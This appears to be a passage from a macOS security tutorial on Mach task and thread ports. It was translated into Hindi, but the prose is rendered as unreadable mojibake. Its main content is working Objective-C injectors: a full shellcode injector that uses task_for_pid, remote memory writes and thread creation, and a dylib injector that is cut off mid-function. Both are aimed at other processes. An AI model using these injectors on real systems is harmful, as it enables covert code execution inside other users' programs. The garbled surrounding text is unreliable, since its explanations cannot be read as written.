рдХрд╛рд░реНрдп рдХреЗ рднреАрддрд░ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрд╛рд░реНрдп рдХреЛ `mach_task_self()` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд▓рд┐рдП рдПрдХ `SEND` рдЕрдзрд┐рдХрд╛рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА (рдЬреЛ `task_self_trap` (28) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ)ред рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде, рдПрдХ рдХрд╛рд░реНрдп рдХрдИ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ:

* `task_threads`: рдХрд╛рд░реНрдп рдХреЗ рдзрд╛рдЧреЛрдВ рдХреЗ рд╕рднреА рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдкрд░ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `task_info`: рдПрдХ рдХрд╛рд░реНрдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `task_suspend/resume`: рдПрдХ рдХрд╛рд░реНрдп рдХреЛ рдирд┐рд▓рдВрдмрд┐рдд рдпрд╛ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ
* `task_[get/set]_special_port`
* `thread_create`: рдПрдХ рдзрд╛рдЧрд╛ рдмрдирд╛рдПрдВ
* `task_[get/set]_state`: рдХрд╛рд░реНрдп рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░реЗрдВ
* рдФрд░ рдЕрдзрд┐рдХ [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдЕрд▓рдЧ рдХрд╛рд░реНрдп** рдХреЗ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдкрд░ SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, рдПрдХ рдЕрд▓рдЧ рдХрд╛рд░реНрдп рдкрд░ рдРрд╕реА рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
{% endhint %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, task\_port рднреА **`vm_map`** рдкреЛрд░реНрдЯ рд╣реИ рдЬреЛ рдПрдХ рдХрд╛рд░реНрдп рдХреЗ рднреАрддрд░ рдореЗрдореЛрд░реА рдХреЛ **рдкрдврд╝рдиреЗ рдФрд░ рд╣реЗрд░рдлреЗрд░ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ `vm_read()` рдФрд░ `vm_write()`ред рдЗрд╕рдХрд╛ рдореВрд▓рддрдГ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдХрд╛рд░реНрдп рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рдЕрд▓рдЧ рдХрд╛рд░реНрдп рдХреЗ task\_port рдкрд░ SEND рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ, рд╡рд╣ рдЙрд╕ рдХрд╛рд░реНрдп рдореЗрдВ **рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ **рдХрд░реНрдиреЗрд▓ рднреА рдПрдХ рдХрд╛рд░реНрдп рд╣реИ**, рдпрджрд┐ рдХреЛрдИ **`kernel_task`** рдкрд░ **SEND рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдХрд░реНрдиреЗрд▓ рдХреЛ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЬреЗрд▓рдмреНрд░реЗрдХ)ред

* рдХреЙрд▓ рдХрд░реЗрдВ `mach_task_self()` рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП **рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХреЙрд▓рд░ рдХрд╛рд░реНрдп рдХреЗ рд▓рд┐рдПред рдпрд╣ рдкреЛрд░реНрдЯ рдХреЗрд╡рд▓ **`exec()`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ** рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ; `fork()` рдХреЗ рд╕рд╛рде рдмрдирд╛рдП рдЧрдП рдирдП рдХрд╛рд░реНрдп рдХреЛ рдПрдХ рдирдпрд╛ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдорд┐рд▓рддрд╛ рд╣реИ (рдПрдХ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдХреЗ рд░реВрдк рдореЗрдВ, рдПрдХ рдХрд╛рд░реНрдп рдХреЛ `exec()` рдХреЗ рдмрд╛рдж рдПрдХ suid рдмрд╛рдЗрдирд░реА рдореЗрдВ рдПрдХ рдирдпрд╛ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рднреА рдорд┐рд▓рддрд╛ рд╣реИ)ред рдПрдХ рдХрд╛рд░реНрдп рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХреЗ рдкреЛрд░реНрдЯ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ ["рдкреЛрд░реНрдЯ рд╕реНрд╡реИрдк рдбрд╛рдВрд╕"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) рдХрд░рдирд╛ рд╣реИ рдЬрдмрдХрд┐ `fork()` рдХрд░ рд░рд╣реЗ рд╣реИрдВред
* рдпреЗ рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдз рд╣реИрдВ (рдмрд╛рдЗрдирд░реА `AppleMobileFileIntegrity` рд╕реЗ `macos_task_policy` рд╕реЗ):
* рдпрджрд┐ рдРрдк рдХреЗ рдкрд╛рд╕ **`com.apple.security.get-task-allow` рдЕрдзрд┐рдХрд╛рд░** рд╣реИ рддреЛ **рд╕рдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреА рд╣реИрдВ (рдЬреЛ рдЖрдорддреМрд░ рдкрд░ Xcode рджреНрд╡рд╛рд░рд╛ рдбрд┐рдмрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ)ред **рдиреЛрдЯрд░реАрдХрд░рдг** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрд╕реЗ рдЙрддреНрдкрд╛рджрди рд░рд┐рд▓реАрдЬрд╝ рдореЗрдВ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдЧреАред
* **`com.apple.system-task-ports`** рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдРрдк рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП **рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рд╕рд┐рд╡рд╛рдп рдХрд░реНрдиреЗрд▓ рдХреЗред рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЗрд╕реЗ **`task_for_pid-allow`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рдерд╛ред рдпрд╣ рдХреЗрд╡рд▓ Apple рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд░реВрдЯ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯреНрд╕** рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдЙрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ **рдЬреЛ** рдПрдХ **рд╣рд░реНрдбрдирдб** рд░рдирдЯрд╛рдЗрдо рдХреЗ рд╕рд╛рде рд╕рдВрдХрд▓рд┐рдд рдирд╣реАрдВ рд╣реИрдВ (рдФрд░ Apple рд╕реЗ рдирд╣реАрдВ рд╣реИрдВ)ред

**рдХрд╛рд░реНрдп рдирд╛рдо рдкреЛрд░реНрдЯ:** _рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ_ рдХрд╛ рдПрдХ рдЕрдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рд╕рдВрд╕реНрдХрд░рдгред рдпрд╣ рдХрд╛рд░реНрдп рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ред рдЗрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рдПрдХрдорд╛рддреНрд░ рдЪреАрдЬ `task_info()` рдкреНрд░рддреАрдд рд╣реЛрддреА рд╣реИред

### рдзрд╛рдЧрд╛ рдкреЛрд░реНрдЯ

рдзрд╛рдЧреЛрдВ рдХреЗ рд╕рд╛рде рднреА рд╕рдВрдмрдВрдзрд┐рдд рдкреЛрд░реНрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд╛рд░реНрдп рд╕реЗ **`task_threads`** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗ `processor_set_threads` рд╕реЗ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВред рдзрд╛рдЧрд╛ рдкреЛрд░реНрдЯ рдкрд░ SEND рдЕрдзрд┐рдХрд╛рд░ `thread_act` рдЙрдкрдкреНрд░рдгрд╛рд▓реА рд╕реЗ рдХрд╛рд░реНрдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕реЗ:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

рдХреЛрдИ рднреА рдзрд╛рдЧрд╛ рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЛ **`mach_thread_sef`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдзрд╛рдЧреЗ рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди

рдЖрдк рдПрдХ рд╢реЗрд▓рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ** рдФрд░ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдзрд┐рдХрд╛рд░** рдЬреЛрдбрд╝реЗрдВ рдЙрд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде (рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдкрдХреЛ **sudo** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
рдЗрд╕рдХреЗ рд▓рд┐рдП iOS рдкрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ `dynamic-codesigning` рдЕрдзрд┐рдХрд╛рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдореЗрдореЛрд░реА рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдмрдирд╛ рд╕рдХреЗрдВред
{% endhint %}

### рдереНрд░реЗрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдореЗрдВ Dylib рдЗрдВрдЬреЗрдХреНрд╢рди

macOS рдореЗрдВ **рдереНрд░реЗрдбреНрд╕** рдХреЛ **Mach** рдпрд╛ **posix `pthread` api** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЗрд░рдлреЗрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд┐рдЫрд▓реЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ рдЬреЛ рдереНрд░реЗрдб рд╣рдордиреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдерд╛, рд╡рд╣ Mach api рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП **рдпрд╣ posix рдЕрдиреБрдкрд╛рд▓рди рдирд╣реАрдВ рд╣реИ**ред

рдПрдХ **рд╕рд░рд▓ рд╢реЗрд▓рдХреЛрдб** рдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ **posix** рдЕрдиреБрдкрд╛рд▓рди рд╡рд╛рд▓реЗ apis рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рдереА, рдХреЗрд╡рд▓ Mach рдХреЗ рд╕рд╛рдеред **рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдЗрдВрдЬреЗрдХреНрд╢рди** рдХреЗ рд▓рд┐рдП **рдереНрд░реЗрдб** рдХреЛ рднреА **posix рдЕрдиреБрдкрд╛рд▓рди** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЗрд╕рд▓рд┐рдП, **рдереНрд░реЗрдб рдХреЛ рд╕реБрдзрд╛рд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **`pthread_create_from_mach_thread`** рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ **рдПрдХ рдорд╛рдиреНрдп pthread рдмрдирд╛рдПрдЧрд╛**ред рдлрд┐рд░, рдпрд╣ рдирдпрд╛ pthread **dlopen** рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдПрдХ dylib рд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирдП рд╢реЗрд▓рдХреЛрдб рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рдмрдЬрд╛рдп рдХрд╕реНрдЯрдо рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдЖрдк **рдЙрджрд╛рд╣рд░рдг dylibs** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╡рд╣ рдЬреЛ рдПрдХ рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдк рдЗрд╕реЗ рд╕реБрди рд╕рдХрддреЗ рд╣реИрдВ):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
